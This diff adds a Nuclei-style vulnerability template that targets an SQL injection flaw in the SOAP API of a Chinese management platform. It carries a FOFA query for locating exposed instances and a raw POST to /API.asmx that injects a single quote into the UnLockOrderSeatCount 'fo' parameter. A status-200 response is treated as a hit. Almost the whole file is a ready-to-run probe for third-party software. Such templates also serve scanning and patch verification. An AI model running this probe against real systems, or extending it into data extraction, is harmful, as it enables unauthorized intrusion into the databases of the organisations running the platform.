@@ -1,0 +1,19 @@
+id: poc-cn7ui0cf8xi4yqpc
+info:
+  name: 管控平台服务端API存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cn7ui0cf8xi4yqpc'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cn7ui0cf8xi4yqpc
+    fofa: body="ItemsControlServer.aspx"
+http:
+- raw:
+  - "POST /API.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.1978.12 Safari/537.36\nSOAPAction: \"http://tempuri.org/UnLockOrderSeatCount\"\nContent-Type: text/xml; charset=utf-8\nContent-Length: 443\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <UnLockOrderSeatCount xmlns=\"http://tempuri.org/\">\n      <fo>'</fo>\n      <ft>string</ft>\n    </UnLockOrderSeatCount>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
